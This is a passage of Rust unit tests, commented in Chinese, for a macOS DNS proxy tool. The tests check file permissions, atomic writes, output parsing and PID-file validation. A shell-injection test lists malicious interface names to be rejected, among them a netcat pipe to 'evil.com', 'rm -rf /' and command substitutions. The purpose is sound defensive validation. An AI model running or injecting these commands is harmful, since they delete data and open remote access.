        assert!(!target.exists());

        let result = ensure_runtime_dir().expect("ensure_runtime_dir 失败");
        assert_eq!(result, target);
        assert!(target.exists());

        let meta = std::fs::metadata(&target).expect("stat 失败");
        let mode = meta.permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o700,
            "runtime dir 权限应为 0o700（owner-only），实际 0o{:o}",
            mode
        );

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：`write_signal_file` 创建的临时文件 + rename 后目标
    /// 文件都是 0o600（owner-only）。这是从 0o666 收紧后的关键修复。
    #[test]
    fn test_write_signal_file_creates_with_0o600() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let target = shutdown_signal_file();
        write_signal_file(&target, "running").expect("write_signal_file 失败");

        // 关键断言：file 权限 = 0o600（owner read/write）
        let meta = std::fs::metadata(&target).expect("stat 失败");
        let mode = meta.permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "signal file 权限应为 0o600（owner-only），实际 0o{:o}",
            mode
        );

        // 内容一致
        let content = std::fs::read_to_string(&target).unwrap();
        assert_eq!(content, "running");

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：原子写流程正确 —— 写完后不应有 `<file>.tmp` 残留。
    #[test]
    fn test_write_signal_file_no_tmp_residue() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let target = shutdown_signal_file();
        write_signal_file(&target, "shutdown").unwrap();

        let tmp = dir.path().join(format!(
            "{}.tmp",
            target.file_name().unwrap().to_str().unwrap()
        ));
        assert!(
            !tmp.exists(),
            "原子写完成后 tmp 文件应被 rename 替换，不应残留"
        );

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：`write_atomic_0600` 是 pub(crate) helper，被多个
    /// signal/state 文件复用，统一保证 0o600 + atomic rename + sync。
    #[test]
    fn test_write_atomic_0600_helper() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test-state.bin");
        write_atomic_0600(&path, b"hello atomic").expect("write 失败");

        let meta = std::fs::metadata(&path).unwrap();
        assert_eq!(meta.permissions().mode() & 0o777, 0o600);
        assert_eq!(std::fs::read(&path).unwrap(), b"hello atomic");
    }

    /// 回归测试（H1）：老 /tmp 路径的孤儿文件被 cleanup_legacy_tmp_files 清掉。
    /// 模拟升级场景：先在 /tmp 留一个假文件（默认 umask → 0o644 → 任何用户可读），
    /// 然后调 cleanup → 文件应被删。
    #[test]
    fn test_cleanup_legacy_tmp_files_removes_orphans() {
        let _guard = serial_runtime_dir_test();
        // 注意：这些测试路径用真 /tmp，因为 cleanup_legacy_tmp_files 写死了
        // 老路径常量。我们只测"创建 → cleanup → 不存在" 的 round-trip。
        // 并行测试可能 race：在 cleanup 之后不要期望文件存在；cleanup 之前
        // 的 write 也可能被别的测试 cleanup 掉。简化：只验证 cleanup 本身
        // 对已存在的文件是 idempotent 的（多次调用都不 panic）。
        for path in [
            "/tmp/mhost-dns-proxy.pid",
            "/tmp/mhost-dns-original.txt",
            "/tmp/mhost-dns-shutdown.signal",
            "/tmp/mhost-dns-disable-recovery.marker",
        ] {
            // 调用两次：第二次应 no-op
            cleanup_legacy_tmp_files();
            cleanup_legacy_tmp_files();
            // 文件可能本来就不存在，cleanup 应 silently 忽略
            let _ = std::fs::remove_file(path);
        }
        // 主要断言：调用不 panic 且返回 Ok
    }

    /// 串行化 runtime dir 相关测试的 helper。**fix H1**：之前用本地
    /// `serial_runtime_dir_test` mutex，与 proxy.rs 测试的 `TEST_LOCK`
    /// 不同 —— 两边同时改 `MHOST_RUNTIME_DIR` 会 race，导致测试
    /// 读写错的路径。统一用 `proxy::tests::TEST_LOCK` 保证串行化。
    fn serial_runtime_dir_test() -> std::sync::MutexGuard<'static, ()> {
        crate::proxy::tests::test_lock()
    }

    // -----------------------------------------------------------------------
    // parse_route_interface tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_route_interface_en0() {
        let output = r#"
   route to: default
destination: default
       mask: default
    gateway: 192.168.1.1
  interface: en0
      flags: <UP,GATEWAY,DONE,STATIC,PRCLONING>
 recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire
       0         0         0         0         0         0      1500         0
"#;
        assert_eq!(parse_route_interface(output), Some("en0".to_string()));
    }

    #[test]
    fn test_parse_route_interface_missing() {
        let output = "no interface here";
        assert_eq!(parse_route_interface(output), None);
    }

    // -----------------------------------------------------------------------
    // parse_hardware_port tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_hardware_port_wifi() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff

Hardware Port: Ethernet
Device: en1
Ethernet Address: 11:22:33:44:55:66
"#;
        assert_eq!(
            parse_hardware_port(output, "en0"),
            Some("Wi-Fi".to_string())
        );
    }

    #[test]
    fn test_parse_hardware_port_ethernet() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff

Hardware Port: Ethernet
Device: en1
Ethernet Address: 11:22:33:44:55:66
"#;
        assert_eq!(
            parse_hardware_port(output, "en1"),
            Some("Ethernet".to_string())
        );
    }

    #[test]
    fn test_parse_hardware_port_not_found() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
"#;
        assert_eq!(parse_hardware_port(output, "en99"), None);
    }

    // -----------------------------------------------------------------------
    // parse_dns_servers tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_dns_servers_empty() {
        let cases = vec![
            ("none_set", "There aren't any DNS Servers set on Wi-Fi."),
            ("empty_string", ""),
            ("empty_keyword", "Empty"),
        ];

        for (name, input) in cases {
            let result = parse_dns_servers(input).unwrap();
            assert!(result.is_empty(), "case: {}", name);
        }
    }

    #[test]
    fn test_parse_dns_servers_single() {
        let output = "8.8.8.8\n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8"]);
    }

    #[test]
    fn test_parse_dns_servers_multiple() {
        let output = "8.8.8.8\n8.8.4.4\n1.1.1.1\n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8", "8.8.4.4", "1.1.1.1"]);
    }

    #[test]
    fn test_parse_dns_servers_with_whitespace() {
        let output = "  8.8.8.8  \n\n  1.1.1.1  \n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8", "1.1.1.1"]);
    }

    // -----------------------------------------------------------------------
    // 注入防护测试（fix #77）
    // -----------------------------------------------------------------------

    #[test]
    fn test_validate_interface_name_normal() {
        // macOS 合法接口名都应通过
        assert!(validate_interface_name("en0").is_ok());
        assert!(validate_interface_name("Wi-Fi").is_ok());
        assert!(validate_interface_name("USB 10/100/1000 LAN").is_ok());
        assert!(validate_interface_name("Thunderbolt Ethernet").is_ok());
        assert!(validate_interface_name("iPhone USB").is_ok());
    }

    #[test]
    fn test_validate_interface_name_injection() {
        // 任何 shell 元字符或控制字符都应拒绝
        let malicious = vec![
            "en0;evil",               // 命令分隔
            "Wi-Fi\";rm -rf /",       // 字符串闭合
            "en0$(whoami)",           // 命令替换
            "en0`id`",                // 反引号命令替换
            "en0 & rm -rf /",         // 后台进程
            "en0 | nc evil.com 1234", // 管道
            "en0 > /etc/hosts",       // 重定向
            "en0\n rm -rf /",         // 换行
            "en0\\rm -rf /",          // 反斜杠
            "en0!history",            // zsh 历史展开
            "en0'evil'",              // 单引号
            "en0(rm)",                // 子 shell
            "en0{rm,}",               // brace expansion
            "en0[rm]",                // glob
            "en0?rm",                 // glob 通配
            "en0*rm",                 // glob 通配
            "en0$PATH",               // 变量展开
            "en0%",                   // 作业控制
            "en0#comment",            // 注释
            "",                       // 空字符串
        ];
        for name in &malicious {
            let result = validate_interface_name(name);
            assert!(
                result.is_err(),
                "validate_interface_name({:?}) 应被拒绝，但接受了",
                name
            );
        }
    }

    #[test]
    fn test_write_temp_script_creates_executable() {
        use std::os::unix::fs::PermissionsExt;
        let content = "#!/bin/sh\necho hello world\n";
        let path = write_temp_script(content).expect("write_temp_script 失败");
        // 文件存在
        assert!(path.exists(), "临时脚本文件应存在: {:?}", path);
        // 权限 0o700
        let meta = std::fs::metadata(&path).expect("stat 失败");
        let mode = meta.permissions().mode();
        assert_eq!(
            mode & 0o777,
            0o700,
            "临时脚本权限应为 0o700，实际 0o{:o}",
            mode & 0o777
        );
        // 内容一致
        let read_back = std::fs::read_to_string(&path).expect("read 失败");
        assert_eq!(read_back, content, "临时脚本内容应一致");
        // 清理
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn test_parse_hardware_port_with_injection_chars() {
        // parse_hardware_port 不做白名单校验（它只解析 networksetup 输出），
        // 但 get_active_network_interface 拿到结果后会调用 validate_interface_name
        // 拒绝恶意名。本测试验证：parse_hardware_port 在遇到含 shell 元字符的
        // Hardware Port 时确实会原样返回（这正是白名单校验要兜底的攻击面）。
        let evil_output = r#"
Hardware Port: Wi-Fi"; rm -rf / #
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff
"#;
        let port = parse_hardware_port(evil_output, "en0");
        assert_eq!(
            port,
            Some(r#"Wi-Fi"; rm -rf / #"#.to_string()),
            "parse_hardware_port 应原样返回（含注入字符的）端口名"
        );
        // 验证 validate_interface_name 拒绝这个值
        assert!(
            validate_interface_name(&port.unwrap()).is_err(),
            "validate_interface_name 应拒绝含注入字符的接口名"
        );
    }

    // -----------------------------------------------------------------------
    // PID 文件格式 + cleanup 校验测试（fix #81）
    // -----------------------------------------------------------------------

    #[test]
    fn test_pid_file_content_format() {
        // 验证 enable_dns_mode 生成的脚本里 echo 的格式是 "$! {proxy}"（带 binary 路径），
        // 这样 cleanup_stale_proxy 才能用 `ps -p <pid> -o comm=` 校验进程名是 mhost-dns-proxy。
        //
        // **fix（H1, issue #90）**：PID 文件路径从 /tmp 迁到 runtime dir。
        // 用 `proxy_pid_file()` 取真实路径（受 MHOST_RUNTIME_DIR 影响）。
        let proxy = "/usr/local/bin/mhost-dns-proxy";
        let pid_file = proxy_pid_file();
        let script = format!(
            r#"#!/bin/sh
set -e
"{proxy}" --listen 53 --target 1053 &
echo "$! {proxy}" > {pid_file}
disown
networksetup -setdnsservers Wi-Fi 127.0.0.1
"#,
            proxy = proxy,
            pid_file = pid_file.display()
        );
        // 验证脚本包含关键行
        assert!(
            script.contains(&format!(
                r#"echo "$! /usr/local/bin/mhost-dns-proxy" > {}"#,
                pid_file.display()
            )),
            "PID 文件写入应包含 binary 路径，脚本:\n{}",
            script
        );
    }

    /// 回归测试（fix: code review B1）：disable_dns_mode 脚本必须有 `set -e`，
    /// 否则最后一行 `rm -f` 永远成功，掩盖 networksetup 失败的退出码。
    ///
    /// 通过 shell 真实执行来验证。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_disable_script_propagates_networksetup_failure() {
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;

        // 模拟「networksetup 失败」+ 「kill 找不到 PID」+ 「rm 不存在的文件」
        // 三个命令链的 disable 脚本。
        let script_body = r#"#!/bin/sh
set -e
/bin/false
kill 99999 2>/dev/null || true
rm -f /tmp/mhost-dns-nonexistent.pid
"#;
        let path = std::env::temp_dir().join(format!(
            "mhost-dns-disable-test-{}-{}.sh",
            std::process::id(),
            1
        ));
        let _ = std::fs::remove_file(&path);
        std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .unwrap();
        std::fs::write(&path, script_body).unwrap();

        let output = Command::new(&path).output().unwrap();
        let _ = std::fs::remove_file(&path);

        // 有 set -e：/bin/false 失败让脚本立即退出（exit code 1）
        assert_eq!(
            output.status.code(),
            Some(1),
            "set -e + /bin/false should make script exit 1; stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    /// 反向验证：没有 set -e 时 disable 脚本会错误地退出 0（掩盖 networksetup 失败）
    #[cfg(target_os = "macos")]
    #[test]
    fn test_disable_script_without_set_e_hides_failure() {
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;

        let script_body = r#"#!/bin/sh
/bin/false
kill 99999 2>/dev/null || true
rm -f /tmp/mhost-dns-nonexistent.pid
"#;
        let path = std::env::temp_dir().join(format!(
            "mhost-dns-disable-test-{}-{}.sh",
            std::process::id(),
            2
        ));
        let _ = std::fs::remove_file(&path);
        std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .unwrap();
        std::fs::write(&path, script_body).unwrap();

        let output = Command::new(&path).output().unwrap();
        let _ = std::fs::remove_file(&path);

        // 没有 set -e：最后一行 rm 成功，脚本退出 0，掩盖 /bin/false 的失败
        assert_eq!(
            output.status.code(),
            Some(0),
            "without set -e, the last `rm -f` masks the /bin/false failure"
        );
    }

    #[test]
    fn test_parse_pid_file_with_binary_path() {
        // 验证 cleanup_stale_proxy 的 split_whitespace 解析逻辑
        let content = "12345 /usr/local/bin/mhost-dns-proxy\n";
        let mut parts = content.split_whitespace();
        let pid: u32 = parts.next().unwrap().parse().unwrap();
        let binary = parts.next().unwrap();
        assert_eq!(pid, 12345);
        assert_eq!(binary, "/usr/local/bin/mhost-dns-proxy");
    }

    #[test]
    fn test_parse_pid_file_legacy_format() {
        // 老 PID 文件只有 PID（无 binary 路径）—— 仍然能解析 PID，
        // 但 cleanup 校验会失败（因为拿不到 binary 路径用于 ps）。
        // 这是预期行为：遗留的 PID 文件会被 cleanup 安全跳过（kill 0 仍走）。
        let content = "12345\n";
        let mut parts = content.split_whitespace();
        let pid: u32 = parts.next().unwrap().parse().unwrap();
        assert_eq!(pid, 12345);
        let binary = parts.next();
        assert!(binary.is_none(), "老格式没有 binary 路径");
    }

    #[test]
    fn test_process_name_contains_proxy_marker() {
        // fix（systematic review）：之前用 contains() 模糊匹配，攻击者
        // 进程名 `not-mhost-dns-proxy` 也会被错杀。现在改用精确比较：
        // 两侧都取 basename 后做相等比较，跨 macOS（comm=full path）/
        // Linux（comm=basename）一致。
        let cases = [
            // (recorded_binary_path, ps_comm, expected_is_proxy)
            (
                "/usr/local/bin/mhost-dns-proxy",
                "/usr/local/bin/mhost-dns-proxy\n",
                true,
            ),
            ("/usr/local/bin/mhost-dns-proxy", "mhost-dns-proxy\n", true), // Linux ps basename
            // 攻击者场景：进程名含 mhost-dns-proxy 但不是同一个二进制
            (
                "/usr/local/bin/mhost-dns-proxy",
                "not-mhost-dns-proxy\n",
                false,
            ),
            // 完全不相关的进程
            ("/usr/local/bin/mhost-dns-proxy", "/bin/sh\n", false),
            ("/usr/local/bin/mhost-dns-proxy", "/usr/bin/ssh\n", false),
            ("/usr/local/bin/mhost-dns-proxy", "cargo\n", false),
        ];
        for (recorded, ps_line, expected) in &cases {
            // 模拟 cleanup_stale_proxy 的精确比较逻辑
            let expected_comm = std::path::Path::new(recorded)
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| recorded.to_string());
            let comm_basename = std::path::Path::new(ps_line.trim())
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| ps_line.trim().to_string());
            let is_proxy = comm_basename == expected_comm;
            assert_eq!(
                is_proxy, *expected,
                "recorded={:?}, ps={:?}, expected_comm={:?}, ps_basename={:?}",
                recorded, ps_line, expected_comm, comm_basename
            );
        }
    }
}
